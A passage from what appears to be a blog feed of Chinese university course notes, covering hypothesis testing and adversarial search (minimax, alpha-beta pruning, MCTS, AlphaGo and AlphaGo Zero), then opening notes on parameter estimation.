$E(P_1-P_2)=p_1-p_2$, $Var(P_1-P_2)=\dfrac{p_1(1-p_1)}{n_1}+\dfrac{p_2(1-p_2)}{n_2}$.</p><p>  那么</p><script type="math/tex; mode=display">  \dfrac{(P_1-P_2)-(p_1-p_2)}{se}\stackrel{近似}{\sim}N(0,1).</script><p>  在 $H_0$ 为真前提下, 有</p><script type="math/tex; mode=display">  se^2=p(1-p)(\dfrac{1}{n_1}+\dfrac{1}{n_2})\approx p^*(1-p^*)(\dfrac{1}{n_1}+\dfrac{1}{n_2}).</script><p>  其中 $p^<em>=\dfrac{k_1+k_2}{n_1+n_2}$, 得 $se^2\approx\hat{se}^2=0.00175^2$. 结合 $\dfrac{P_1-P_2}{\hat{se}}\stackrel{近似}{\sim}N(0,1)$, 得 <em>*P</em></em> 值</p><script type="math/tex; mode=display">  P\Big(\dfrac{P_1-P_2}{\hat{se}}\le\dfrac{0.0126-0.0217}{0.00175}\Big)\approx P(Z\le -5.20)\approx 10^{-7}.</script><p>  因此有理由拒绝 $H_0$.</p></li><li><p><strong>注</strong></p><ul><li>随机分组.</li><li>双盲实验.</li><li>$n$ 充分大.</li></ul></li><li><p><strong>例(行驶里程)</strong>  比较两种油 <strong>A</strong> 与 <strong>B</strong> 的行驶里程.</p><p>  |          | 样本容量 | 平均里程 | 样本标准差 |<br>  | ———— | ———— | ———— | ————— |<br>  | 油 <strong>A</strong> | 50       | 25       | 5.00       |<br>  | 油 <strong>B</strong> | 50       | 26       | 4.00       |</p><p>  提出假设 $H_0:\mu_A=\mu_B$ v.s. $H_1:\mu_A\ne\mu_B$, 检验统计量为 $\overline{X}_A-\overline{X}_B$.</p><p>  在 $H_0$ 为真前提下, 有</p><script type="math/tex; mode=display">  \dfrac{\overline{X}_A-\overline{X}_B}{\sqrt{\tfrac{S_1^2}{n_1}+\tfrac{S_2^2}{n_2}}}\sim N(0,1).</script><p>  其中 $\hat{se}\approx 0.905$. 得 <strong>P</strong> 值</p><script type="math/tex; mode=display">  P\Big(\vert\dfrac{\overline{X}_A-\overline{X}_B}{\hat{se}}\vert\ge\vert\dfrac{25-26}{0.905}\vert\Big)\approx P(\vert Z\vert\ge 1.1)\approx 0.2714.</script><p>  认为哪种油行驶里程更长的理由均不充分.</p></li></ul><h2 id="两相关总体比较"><a href="#两相关总体比较" class="headerlink" title="两相关总体比较"></a>两相关总体比较</h2><ul><li><p><strong>例(行驶里程-改进)</strong>  同一辆车不同日子加不同油, 记录行驶里程.</p><p>  | 车号     | 油 A     | 油 B     | 差异 ($d_i$) |<br>  | ———— | ———— | ———— | —————— |<br>  | 1        | 27.01    | 26.95    | 0.06         |<br>  | 2        | 20.00    | 20.44    | -0.44        |<br>  | $\cdots$ | $\cdots$ | $\cdots$ | $\cdots$     |<br>  | 10       | 25.22    | 26.01    | -0.79        |<br>  | 均值     | 25.20    | 25.80    | -0.60        |<br>  | 标准差   | 4.27     | 4.10     | 0.61         |</p><p>  提出假设 $H_0:\mu_d=0$ v.s. $H_1:\mu_d\ne 0$, 检验统计量为 $\overline{d}$.</p><p>  假设 $d_i$ 服从正态分布. 在 $H_0$ 为真前提下, 有</p><script type="math/tex; mode=display">  \dfrac{\overline{d}}{\tfrac{S_d}{\sqrt{n}}}\sim t(n-1).</script><p>  得 <strong>P</strong> 值</p><script type="math/tex; mode=display">  P\Big(\vert t(9)\vert\ge\vert\dfrac{-0.60}{\tfrac{0.61}{\sqrt{10}}}\vert\Big)\approx 0.012.</script><p>  有理由拒绝 $H_0$, 两种油的行驶里程有差距.</p></li><li><p><strong>注</strong>  假设检验不能检验试验设计, 仅对数据负责; 功能有限, 作为决策辅助.</p></li></ul><h2 id="Bayes-假设检验"><a href="#Bayes-假设检验" class="headerlink" title="Bayes 假设检验"></a>Bayes 假设检验</h2><ul><li><p><strong>例</strong>  两种硬币 ($p=0.5$, $p=0.7$) 投掷 $n=10$ 次, 正面向上 $X=x$ 次. 提出假设 $H_0:p=0.5$ v.s. $p=0.7$​. 考虑</p><script type="math/tex; mode=display">  \dfrac{P(H_0\mid x)}{P(H_1\mid x)}=\dfrac{P(H_0)P(x\mid H_0)}{P(H_1)P(x\mid H_1)}<1</script><p>  则拒绝 $H_0$.</p></li><li><p><strong>注</strong>  给出一个特别的例子, $H_0:\theta=\theta_0$, $\Theta$ 连续. 则 $P(H_0\mid x)=0$, 此时似乎总是会拒绝 $H_0$? (陈书 <strong>Chap 5.28</strong>)</p></li></ul><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><h3 id="决策"><a href="#决策" class="headerlink" title="决策"></a>决策</h3><ul><li>拒绝 $H_0$ 或不拒绝 $H_0$.</li><li>检验=决策准则 $\Leftrightarrow$ 拒绝域 $R$ 的划分.</li><li>关键:<ul><li>选择合适的检验统计量.</li><li>确定拒绝域的形状 (由 $H_1$ 决定).</li></ul></li><li>拒绝 $H_0$ 有时也称观测值是显著的.</li></ul><h3 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h3><ul><li><p>统计学中没有绝对的证实或证伪.</p><script type="math/tex; mode=display">  \alpha(R):=P_{\theta}((X_1,\cdots,X_n)\in R\mid H_0).\\  \beta(R):=P_{\theta}((X_1,\cdots,X_n)\in R^c\mid H_1).</script></li><li><p>检验程序的属性, 不是样本的属性. 样本做决策要么正确要么错误.</p><script type="math/tex; mode=display">  \alpha(R)\le\alpha.\\  \beta(R)\le\beta.</script><p>  预先指定的可接受的长期错误率.</p></li></ul><h3 id="显著性检验-v-s-Neyman-Pearson-检验"><a href="#显著性检验-v-s-Neyman-Pearson-检验" class="headerlink" title="显著性检验 v.s. Neyman-Pearson 检验"></a>显著性检验 v.s. Neyman-Pearson 检验</h3><ul><li><p>显著性检验: 只控制 $\alpha(R)\le\alpha$.</p></li><li><p><strong>Neyman-Pearson</strong> 假设检验: 强调两类错误、功效, $H_0,H_1$ 地位不均等.</p></li><li><p>不拒绝 $H_0$ $\ne$ 接受 $H_0$.</p></li><li><p>$\beta(R)$ 越小 (功效越大), 当 $H_0$ 不真时, 越有可能拒绝 $H_0$; 当观测支持 $H_0$, 则可以接受 $H_0$.</p></li><li><p>若忽略了对 $\beta(R)$ 的系统控制 (常见情形), 将导致对结果及下一步工作方向的误判.</p></li><li><p><strong>例</strong>  $H_0:\mu\ge 5$, $H_1:\mu&lt;5$. $n=10$, $\sigma=0.01$, $\alpha=0.01$.</p></li><li><p><strong>解答</strong>  临界值</p><script type="math/tex; mode=display">  c=\mu_0-Z_{\alpha}\dfrac{\sigma}{\sqrt{n}}\approx 4.993.</script></li></ul><h3 id="P-值"><a href="#P-值" class="headerlink" title="P 值"></a>P 值</h3><ul><li>一次具体的观测值没有概率可言, <strong>P</strong> 不能衡量决策错误的概率. (<strong>ASA</strong> 文章)</li></ul><h3 id="卡方检验-——-多项分布的检验"><a href="#卡方检验-——-多项分布的检验" class="headerlink" title="卡方检验 —— 多项分布的检验"></a>卡方检验 —— 多项分布的检验</h3><ul><li><strong>例</strong>  $H_0: p_1=p$, $p_2=1-p$. 此时<script type="math/tex; mode=display">  \begin{aligned}  \chi^2&=\dfrac{(O_1-np_1)^2}{np_1}+\dfrac{(O_2-np_2)^2}{np_2}\\  &=\dfrac{(O_1-np)^2}{np}+\dfrac{(O_1-np)^2}{n(1-p)}\\  &=\dfrac{(O_1-np)^2}{np(1-p)}\\  &\stackrel{近似}{\sim} N^2(0,1)=\chi^2(1).  \end{aligned}</script></li></ul><h3 id="统计显著-ne-实际显著"><a href="#统计显著-ne-实际显著" class="headerlink" title="统计显著 $\ne$ 实际显著"></a>统计显著 $\ne$ 实际显著</h3><ul><li><p><strong>例</strong>  投掷骰子 $n=6\times 10^{10}$ 次​.</p><p>  | 点数               | 1         | 2                  | 3                 | 4                | 5                 | 6                  | 总计              |<br>  | ————————— | ————- | ————————— | ————————- | ———————— | ————————- | ————————— | ————————- |<br>  | 观测频数 $10^{10}$ | $-10^{6}$ | $1.5\times 10^{6}$ | $-2\times 10^{6}$ | $4\times 10^{6}$ | $-3\times 10^{6}$ | $0.5\times 10^{6}$ | $6\times 10^{10}$ |</p><p>  $H_0:$ 分布均匀, $H_1:$ 分布不均匀. </p></li><li><p>计算得到 $\chi^2=3250$, 此时 <strong>P</strong> 值 $\ll 0.0001$. 因此拒绝 $H_0$, 统计显著. </p></li><li><p>实际上 $\vert\hat p_i-\dfrac{1}{6}\vert\sim 10^{-4}$, 实际角度视为无差异, 实际不显著.</p></li><li><p>$n$ 过大, 明察秋毫; $\chi^2$ 统计量关于 $n$ 是非齐次的.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能导论 笔记3</title>
      <link href="/2023/05/12/ren-gong-zhi-neng-dao-lun-bi-ji-3/"/>
      <url>/2023/05/12/ren-gong-zhi-neng-dao-lun-bi-ji-3/</url>
      
        <content type="html"><![CDATA[<h1 id="第三章-对抗搜索"><a href="#第三章-对抗搜索" class="headerlink" title="第三章 对抗搜索"></a>第三章 对抗搜索</h1><h2 id="博弈问题"><a href="#博弈问题" class="headerlink" title="博弈问题"></a>博弈问题</h2><ul><li>一人一步、信息完备、零和博弈.</li><li>通常<strong>不具有穷举性</strong> (棋类问题).</li></ul><h2 id="极小-极大模型"><a href="#极小-极大模型" class="headerlink" title="极小-极大模型"></a>极小-极大模型</h2><ul><li><p>目标: <strong>对方不犯错</strong>的情况下<strong>结局对自己有利</strong> (有利节点的数值&gt;0).</p></li><li><p>圆形为<strong>极小节点</strong>, 正方形为<strong>极大节点</strong>, 自己应该始终沿着极大值行进.</p>  <div align="center"><img src="/pic/113.png" width="100%" height="100%"></div></li><li><p>模仿人类下棋思考过程, 但<strong>有限深度内的穷举</strong>不可行.</p></li><li><p>为解决模型存在的问题, 只在<strong>少数可能的走步范围内</strong>考虑.</p></li></ul><h2 id="alpha-beta-减枝算法"><a href="#alpha-beta-减枝算法" class="headerlink" title="$\alpha$-$\beta$ 减枝算法"></a>$\alpha$-$\beta$ 减枝算法</h2><ul><li><p>极大节点的下界为 $\alpha$, 极小节点的上界为 $\beta$, 使用 <strong>DFS</strong> 生成节点.</p></li><li><p>剪枝条件:</p><ul><li><strong>后辈节点的 $\beta$ 值 ≤ 祖先节点的 $\alpha$ 值时, $\alpha$ 剪枝.</strong></li><li><strong>后辈节点的 $\alpha$ 值 ≥ 祖先节点的 $\beta$ 值时, $\beta$ 剪枝.</strong></li></ul></li><li><p>简记:</p><ul><li><strong>极小 ≤ 极大, 剪枝.</strong></li><li><p><strong>极大 ≥ 极小, 剪枝.</strong></p><div align="center"><img src="/pic/114.png" width="100%" height="100%"></div><div align="center"><img src="/pic/115.png" width="100%" height="100%"></div></li></ul></li><li><p>注意:</p><ul><li>估值需要总结专家知识.</li><li><strong>比较</strong>大小需要<strong>所有祖先节点</strong>进行比较.</li><li>先决定是否<strong>剪枝</strong>, 再决定是否<strong>上传</strong>.</li><li>$\alpha$-$\beta$ 减枝仅能<strong>决定接下来一步的最优选择</strong>.</li><li>对局面评估的准确性要求高.</li></ul></li></ul><h2 id="Monte-Carlo-方法"><a href="#Monte-Carlo-方法" class="headerlink" title="Monte Carlo 方法"></a>Monte Carlo 方法</h2><ul><li><p>从所有可落子点<strong>随机选择</strong>, 重复直到胜负可判断, <strong>多次模拟</strong>选择<strong>胜率最大</strong>的点.</p></li><li><p><strong>(MCTS)</strong> <strong>蒙特卡洛树搜索</strong>:</p><ul><li><p>将可能出现的状态转移过程用<strong>状态树</strong>表示.</p></li><li><p>从初始状态开始重复抽样, 逐步扩展.</p></li><li><p>树中的节点<strong>父节点可以利用子节点的模拟结果</strong>，提高了效率.</p></li><li><p>在搜索过程中可以<strong>随时得到行为的评价</strong>.</p></li><li><p>选择策略:</p><ul><li>对具有较大希望节点的<strong>利用</strong>.</li><li><p>对尚未充分了解节点的<strong>探索</strong>.</p><div align="center"><img src="/pic/116.png" width="100%" height="100%"></div></li></ul></li></ul></li><li><p><strong>(UCB)</strong> <strong>信心上限算法</strong>:</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> UCB1<span class="token punctuation">:</span><span class="token keyword">for</span> each j <span class="token keyword">in</span> 拉杆<span class="token punctuation">:</span>访问 j 并记录收益<span class="token keyword">while</span> 尚未达到访问次数限制<span class="token punctuation">:</span>计算每个拉杆的 UCB1 信心上界 Ij访问信心上界最大的拉杆<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="math/tex; mode=display">  I_j=\overline{X}_j+c\sqrt{\dfrac{2\ln n}{T_j(n)}}.</script><ul><li><p>$\overline{X}_j$ 是拉杆 $j$ 所获得<strong>回报的均值</strong>.</p></li><li><p>$n$ 是到当前这一时刻为止所访问的总次数.</p></li><li><p>$T_j(n)$ 是拉杆 $j$ 到目前为止所<strong>访问的次数</strong>.</p></li><li><p>上式考虑了 <strong>“利用” 和 “探索” 间的平衡</strong>.</p></li></ul></li><li><p><strong>(UCT)</strong> <strong>信心上限树算法</strong>:</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">UctSearch</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token triple-quoted-string string">'''  TREEPOLICY:  节点还可扩展--扩展并模拟节点不可扩展--从子节点选择一个并循环  '''</span>以状态s0创建根节点v0<span class="token punctuation">;</span>    <span class="token keyword">while</span> 尚未用完计算时长<span class="token punctuation">:</span>      vl <span class="token operator">=</span> TreePolicy<span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>      △ <span class="token operator">=</span> DefaultPolicy<span class="token punctuation">(</span>s<span class="token punctuation">(</span>vl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      Backup<span class="token punctuation">(</span>vl，△<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">(</span>BestChild<span class="token punctuation">(</span>v0，<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>每个节点记录: <strong>获胜</strong>次数 / <strong>模拟</strong>总次数.</p></li><li><p><strong>获胜次数相对于本节点角度</strong>, <strong>方便进行选择.</strong></p></li><li><p>假设 $c=0$, 此时 $I_j=\overline{X}_j$.</p>  <div align="center"><img src="/pic/117.png" width="100%" height="100%"></div></li></ul></li></ul><h2 id="AlphaGo-原理"><a href="#AlphaGo-原理" class="headerlink" title="AlphaGo 原理"></a>AlphaGo 原理</h2><ul><li><p><strong>MCTS</strong> 存在的问题:</p><ul><li>生成<strong>所有子节点</strong>.</li><li>模拟具有<strong>盲目性</strong>.</li></ul></li><li><p><strong>AlphaGo</strong> 中神经网络与 <strong>MCTS</strong> 结合:</p><ul><li>缩小了搜索<strong>范围</strong>.</li><li><p>提高了模拟<strong>水平</strong>.</p><div align="center"><img src="/pic/118.png" width="100%" height="100%"></div></li><li><p><strong>策略网络</strong>:</p><ul><li><p>输入: 当前棋局 —— <strong>48</strong> 个通道, 每个通道大小为 <strong>19*19</strong>.</p></li><li><p>输出: 棋盘上每个点的<strong>行棋概率</strong> —— 概率越大, 行棋点越好.</p></li><li><p>训练数据: <strong>16</strong> 万盘人类棋手的数据.</p></li><li><p><strong>分类问题</strong>: 任意一个棋局分类为 <strong>361</strong> 类之一, 行棋点为标记.</p></li><li><p><strong>损失函数</strong>:</p><script type="math/tex; mode=display">  L(w)=-t_a\log p_a.</script><p>  其中 $t_a$ 为当前棋局下棋手落子在 $a$ 处时为 1, 否则为 0; $p_a$ 为策略网络在 $a$ 处落子的概率.</p>  <div align="center"><img src="/pic/119.png" width="100%" height="100%"></div></li></ul></li><li><p>估值网络: 由一个神经网络构成.</p><ul><li><p>输入: 当前棋局 —— <strong>49</strong> 个通道, 每个通道大小为 <strong>19*19</strong>.</p></li><li><p>输出: 当前棋局的<strong>收益</strong> —— 收益的取值范围为 $[-1, 1]$.</p></li><li><p>训练数据: <strong>16</strong> 万盘人类棋手的数据.</p></li><li><p><strong>回归问题</strong>: 获胜时收益为 $1$, 失败时收益为 $-1$.</p></li><li><p><strong>损失函数</strong>:</p><script type="math/tex; mode=display">  L(w)=(R-V(s))^2.</script><p>  其中 $R$ 为棋局的胜负, 胜为 1, 负为 -1; $V(s)$ 为估值网络的输出, 即预测的收益.</p>  <div align="center"><img src="/pic/120.png" width="100%" height="100%"></div></li></ul></li><li><p><strong>MCTS</strong> 中的选择原则:</p><ul><li><strong>利用</strong>: 收益好的节点.</li><li><p><strong>探索</strong>: 模拟次数少的节点.</p></li><li><p><strong>经验</strong>: <strong>落子概率高</strong>的节点 (<strong>AlphaGo</strong> 增加的第三个原则).</p></li></ul></li><li><p>节点 $s$ 第 $i$ 次<strong>模拟的收益</strong>:</p><script type="math/tex; mode=display">  v_i(s)=\lambda value(s)+(1-\lambda)rollout(s).</script><p>  其中 $value(s)$ 是估值网络的输出, $rollout(s)$ 是一次模拟结果.</p></li><li><p><strong>平均收益</strong>:</p><script type="math/tex; mode=display">  Q(s_a)=\dfrac{1}{n}\sum\limits_{i=1}^{n}v_i(s_a).</script><p>  其中 $s(a)$ 为 $s$ 棋局下在 $a$ 处落子后的棋局.</p></li><li><p><strong>探索项</strong>:</p><script type="math/tex; mode=display">   u(s_a)=c\cdot p(s_a)\dfrac{\sqrt{N(s)}}{N(s_a+1)}.</script><p>  其中 $N(\cdot)$ 为模拟次数, $p(s_a)$ 为策略网络在 $a$ 处下棋概率, $c$ 为加权系数.</p></li></ul></li><li><p><strong>AlphaGo</strong> 中的 <strong>MCTS</strong> 过程:</p>  <div align="center"><img src="/pic/121.png" width="100%" height="100%"></div><ul><li>用 $Q(s_a)+u(s_a)$ 代替信心上限 $I_j$, 优先选择 $Q(s_a)+u(s_a)$ 大的子节点.</li><li>遇到叶节点 $s_l$ 结束, 该节点被选中.</li><li>生成 $s_l$ 的<strong>所有子节点</strong>, 但是<strong>不进行模拟</strong>.</li><li><p>规定了<strong>最大节点深度</strong>.</p><div align="center"><img src="/pic/122.png" width="100%" height="100%"></div></li><li><p>对 $s_l$ 进行模拟, 计算:</p><script type="math/tex; mode=display">  v_i(s)=\lambda value(s)+(1-\lambda)rollout(s).</script></li><li><p><strong>模拟</strong>过程采用<strong>推演策略网络</strong>, 其速度快, 是策略网络的 $1000$ 倍.</p></li><li><p>规定了<strong>总模拟次数</strong>.</p></li></ul></li></ul><h2 id="围棋中的深度强化学习方法"><a href="#围棋中的深度强化学习方法" class="headerlink" title="围棋中的深度强化学习方法"></a>围棋中的深度强化学习方法</h2><ul><li><p>强化学习:</p><ul><li>学习 “做什么才能使得<strong>收益最大化</strong>” 的方法.</li><li>学习者不会被告知如何做, 必须自己通过尝试发现哪些动作会产生最大的收益.</li><li><strong>监督学习</strong>使用<strong>策略网络</strong>、<strong>无需尝试</strong>.</li><li>两个特征: <strong>试错</strong>和<strong>延迟收益</strong>.</li></ul></li><li><p>深度强化学习:</p><ul><li>用<strong>深度学习 (神经网络) 方法</strong>实现的强化学习.</li></ul></li><li><p>关键问题: 如何获得<strong>指示信号</strong>?</p><ul><li>监督学习: <strong>情景与标注一一对应</strong>.</li><li>强化学习:<ul><li><strong>将收益转化为 “标注”</strong>.</li><li>不能获得所有情况下既正确又有代表性的示例.</li></ul></li></ul></li><li><p>手段:</p><ul><li>将<strong>深度强化学习问题</strong>转化为<strong>神经网络训练问题</strong>.</li><li>不同的转换方法构成了不同的深度强化学习方法.</li><li>关键是<strong>损失函数的定义</strong>.</li></ul></li><li><p>围棋中深度强化学习的三种实现方法:</p><ul><li><p>基于<strong>策略梯度</strong>的强化学习:</p><ul><li><p>数据: $(s,a,p_a,t_a)$ (棋局、行棋、获胜概率、延迟胜负值).</p><p>  $t_a$ 为胜负值, 胜为 1, 负为 -1.</p></li><li><p>损失函数: $L(w)=-t_a\log⁡(p_a)$.</p><ul><li>假设获胜者的行为都是正确的, 负者行为都是不正确的.</li><li>假设获负时对权重的修改量大小与获胜时一样, 方向相反.</li></ul><div align="center"><img src="/pic/123.png" width="100%" height="100%"></div></li><li><p><strong>AlphaGo</strong>: <strong>先监督学习, 再强化学习.</strong></p></li><li>注意点:<ul><li>强化学习过程中, 每个<strong>样本只使用一次</strong>;</li><li>基于策略梯度的<strong>强化学习</strong>学到了在每个可落子点行棋的<strong>获胜概率</strong>; <strong>监督学习</strong>学到了在某个可落子点的<strong>行棋概率</strong>.</li></ul></li></ul></li><li><p>基于<strong>价值评估</strong>的强化学习:</p><ul><li><p>输入: 当前棋局和行棋点.</p></li><li><p>输出: 取值在 -1、1 之间的估值.</p></li><li><p>数据: $(s,a,V(s,a),R)$ (棋局、行棋、网络输出、延迟胜负值).</p><p>  $R$ 为胜负值, 胜为 1, 负为 -1.</p></li><li><p>损失函数: $L(w)=(E-V(s,a))^2$.</p></li><li><p><strong>基于价值评估的强化学习</strong>学到了每个落子点<strong>获取最大收益的概率</strong>.</p><div align="center"><img src="/pic/124.png" width="100%" height="100%"></div></li></ul></li><li><p>基于<strong>演员-评价方法</strong>的强化学习:</p>  <div align="center"><img src="/pic/125.png" width="100%" height="100%"></div><ul><li><p>收益增量:</p><ul><li><p>评价一步棋的好坏</p><script type="math/tex; mode=display">  A=Q(s,a)-V(s).</script></li><li><p>$V(s)$ 为棋局 $s$ 的<strong>预期收益</strong>, 取值范围为 $[-1, 1]$.</p></li><li><p>$Q(s,a)$ 为在 $a$ 处<strong>行棋后的收益</strong>, 取值范围为 $[-1, 1]$.</p></li><li><p>$A$ 为<strong>收益增量</strong>, 取值范围为 $[-2, 2]$.</p></li><li><p>$A$ 越大越说明走了一步妙招, 越小越说明走了一步败招.</p></li></ul></li><li><p>收益增量的计算:</p><script type="math/tex; mode=display">  A=R-V(s).</script><p>  其中 $R$ 为胜负值, 胜为 $1$, 负为 $-1$.</p></li><li><p>损失函数:</p><ul><li>评价部分: $L_1(w)=(R-V(s))^2$.</li><li>演员部分: $L_2(w)=-\vert A\vert t_a\log(p_a)=-A\log(p_a)$.</li><li>综合损失函数: $L(w)=L_1(w)+\lambda L_2(w)$.</li></ul></li><li><p><strong>基于演员-评价方法的强化学习</strong>强调<strong>重要行棋点的学习</strong>, 学到了每个落子点获取<strong>最大收益增量的概率</strong>.</p><div align="center"><img src="/pic/126.png" width="100%" height="100%"></div></li></ul></li></ul></li></ul><h2 id="AlphaGo-Zero-原理"><a href="#AlphaGo-Zero-原理" class="headerlink" title="AlphaGo Zero 原理"></a>AlphaGo Zero 原理</h2><ul><li><p>从零学习:</p><ul><li>不再使用人类棋手的数据.</li><li>不再使用人工特征作为输入 (自动抽取).</li><li>利用<strong>强化学习从零学习</strong>.</li></ul></li><li><p><strong>AlphaGo Zero</strong> 的网络结构:</p><ul><li><p>将<strong>策略网络、估值网络</strong>合并为一个 <strong>“双输出” 网络</strong>.</p></li><li><p>输入: <strong>17</strong> 个通道, 每个通道大小为 <strong>19*19</strong>.</p></li><li><p>策略网络输出: <strong>19×19+1</strong>, <strong>多了一个 “放弃” 行为.</strong></p></li><li><p>估值网络输出: 当前棋局的<strong>估值</strong>, 取值范围为 $[-1, 1]$.</p><div align="center"><img src="/pic/127.png" width="100%" height="100%"></div></li></ul></li><li><p><strong>AlphaGo Zero</strong> 中的 <strong>MCTS</strong>:</p><ul><li><p>节点 $s$ 第 $i$ 次<strong>模拟的收益</strong> (<strong>AlphaGo</strong> $\Rightarrow$ <strong>AlphaGo Zero</strong>):</p><script type="math/tex; mode=display">  v_i(s)=\lambda value(s)+(1-\lambda)rollout(s)\Rightarrow v_i(s)=value(s).</script><p>  其中 $value(s)$ 是<strong>估值网络</strong>的输出.</p></li><li><p><strong>平均收益</strong>:</p><script type="math/tex; mode=display">  Q(s_a)=\dfrac{1}{n}\sum\limits_{i=1}^{n}v_i(s_a).</script><p>  其中 $s(a)$ 为 $s$ 棋局下在 $a$ 处落子后的棋局.</p></li><li><p><strong>探索项</strong>:</p><script type="math/tex; mode=display">   u(s_a)=c\cdot p(s_a)\dfrac{\sqrt{N(s)}}{N(s_a+1)}.</script><p>  其中 $N(\cdot)$ 为模拟次数, $p(s_a)$ 为<strong>策略网络</strong>在 $a$ 处下棋概率, $c$ 为加权系数.</p></li></ul></li><li><p><strong>AlphaGo Zero</strong> 中的 <strong>MCTS</strong> 过程:</p><ul><li><p><strong>选择</strong>:</p><ul><li><p>用 $Q(s_a)+u(s_a)$ 代替信心上限 $I_j$, 选择 $Q(s_a)+u(s_a)$ 大的子节点;</p></li><li><p>遇到叶节点 $s_l$ 结束, 该节点被选中.</p></li></ul></li><li><p><strong>生成</strong>:</p><ul><li><p>生成 $s_l$ 的所有子节点, 但是<strong>不进行模拟</strong>;</p></li><li><p>规定了<strong>最大节点深度</strong>.</p></li></ul></li><li><p><strong>模拟回传</strong>:</p><ul><li><p>用<strong>估值网络</strong>输出<strong>取代</strong>快速<strong>模拟</strong>过程, 对 $s_l$ 进行模拟, 计算:</p><script type="math/tex; mode=display">  v_i(s)=value(s).</script></li><li><p>规定了<strong>总模拟次数</strong>.</p></li></ul></li></ul></li><li><p><strong>损失函数</strong>:</p><ul><li><p><strong>估值网络</strong>部分:</p><script type="math/tex; mode=display">  L_1=(z-v)^2.</script><p>  其中 $v$ 是估值网络的输出, $z$ 是胜负值.</p></li><li><p><strong>策略网络</strong>部分:</p><script type="math/tex; mode=display">  L_2=-\sum_{i=1}^{362}\pi_i\log(p_i).</script><p>  其中 $\pi(i)$ 是 <strong>MCTS</strong> 输出的每个落子点的概率 (与每个点被选中次数有关), $p_i$ 是策略网络输出的每个落子点的概率.</p></li><li><p><strong>综合损失函数</strong>:</p><script type="math/tex; mode=display">  L=L_1+L_2+\Vert\theta\Vert_2^2.</script><p>  其中 $\Vert\theta\Vert_2^2$ <strong>防止出现过拟合</strong>.</p></li></ul></li><li><p>引入<strong>多样性</strong>: </p><ul><li><p>防止走向错误的方向, 对策略网络的输出人为引入噪声.</p></li><li><p><strong>狄利克雷分布</strong>:</p><ul><li>通过参数可以产生一些<strong>符合一定条件的概率分布</strong>.</li><li>控制参数 $n$ 概率分布向量的长度与 $\alpha$ 分布浓度.</li></ul></li><li><p>落子概率:</p><script type="math/tex; mode=display">  p=\lambda p_a+(1-\lambda)p_d.</script><p>  其中 $p_a$ 为<strong>策略网络输出</strong>, $p_d$ 为<strong>狄利克雷分布采样</strong>.</p></li><li><p>引入噪声不会引起 “不良反应”, <strong>MCTS</strong> 具有 <strong>“纠错” 能力</strong>.</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> IAI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IAI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记6</title>
      <link href="/2023/05/07/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-6/"/>
      <url>/2023/05/07/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-6/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-6-参数估计"><a href="#Chap-6-参数估计" class="headerlink" title="Chap 6 参数估计"></a>Chap 6 参数估计</h1><ul><li><p><strong>引入</strong>  检测某厂一大批电子元件寿命指标是否合格.</p></li><li><p><strong>总体</strong></p><ul><li>所需检测的电子元件寿命;</li><li>统计分析问题中研究的对象全体的某个数字特征 $X$.</li><li>元件寿命的分布;</li><li>变量 $X$ 的分布.</li></ul></li><li><p><strong>统计总体</strong>  一个概率分布.</p></li><li><p><strong>注</strong></p><ul><li>有限总体;</li><li>无限总体.</li></ul></li><li><p><strong>统计模型</strong></p><ul><li>一族概率分布;</li><li>参数模型 (正态模型);</li><li>非参数模型.</li></ul></li><li><p><strong>样本</strong></p><ul><li>$(X_1,\cdots,X_n)$, 其中 $X_i$ 来自总体 $X$, $n$ 为样本容量;</li><li>获取方式:<ul><li>试验;</li><li>观察 (完全 / 不完全).</li></ul></li></ul></li><li><p><strong>简单随机抽样</strong></p><ul><li>总体个数 $N$ 有限;</li><li>无放回;</li><li>容量为 $n$ 的样本抽取出来的概率为 $p=\dfrac{1}{C_N^n}$.</li></ul></li><li><p><strong>随机样本</strong></p><ul><li>$X_1,\cdots,X_n$ 独立同分布, 例: 有放回 / 近似有放回 ($n&lt;&lt;N$).</li></ul></li><li><p><strong>统计量</strong></p><ul><li><p>$T(X_1,\cdots,X_n)$ - 完全由样本决定, 是一种数据简化方式.</p></li><li><p>样本均值</p><script type="math/tex; mode=display">  \overline{X}=\dfrac{1}{n}\sum_{i=1}^{n}X_i.</script></li><li><p>样本方差 </p><script type="math/tex; mode=display">  S^2=\dfrac{1}{n-1}\sum_{i=1}^{n}(X_i-\overline{X})^2.</script></li></ul></li><li><p><strong>统计推断</strong></p><ul><li>总体为因, 样本为果;</li><li>总体决定样本, 样本推断总体;</li><li>经典方法 (频率) v.s. <strong>Bayes</strong>方法.</li><li><strong>例</strong>  $Y_i=aX_i+\varepsilon_i$.<ul><li>求 $a$. $(X_i,Y_i)(1\le i\le n)\rightarrow a\approx\hat{a}$ (模型推断 参数估计)</li><li>已知 $a=\hat{a}$, 观测到 $Y_i$, 求 $X_i$ (变量推断)</li></ul></li><li><strong>例</strong>  元件寿命.<ul><li>假设 $X\sim Exp(\lambda)$, 求 $\lambda$ (参数估计)</li><li>假设合格标准 $E(X)\ge L$, 